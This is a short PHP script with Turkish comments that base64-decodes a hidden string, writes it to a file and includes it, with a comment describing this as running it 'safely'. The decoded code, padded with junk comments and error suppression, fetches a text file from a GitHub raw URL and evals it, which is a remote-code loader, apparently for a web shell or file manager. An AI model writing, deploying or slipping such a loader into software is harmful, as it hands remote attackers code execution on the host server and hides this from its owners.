<?php
// Şifrelenmiş string
$encrypted_str = 'LyoqKiovQG51bGw7IC8qKioqKioqKi8gLyoqKioqKiovIC8qKioqKioqKi9AZXZhbC8qKioqLygiPz4iLmZpbGVfZ2V0X2NvbnRlbnRzLyoqKioqKiovKHVybGRlY29kZSh1cmxlbmNvZGUocmF3dXJsZGVjb2RlKHJhd3VybGVuY29kZSgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hpbG5ldC9tZXRva2wvbWFpbi9mbS50eHQiKSkpKSkpOy8qKi8=';

// Base64 kodunu çözme
$func_name = 'base64' . '_decode';
$code = $func_name($encrypted_str);

// Çözülmüş kodu dosyaya yaz
file_put_contents('decoded_code.php', "<?php\n" . $code);

// Güvenli bir şekilde çalıştır
include 'decoded_code.php';
?>
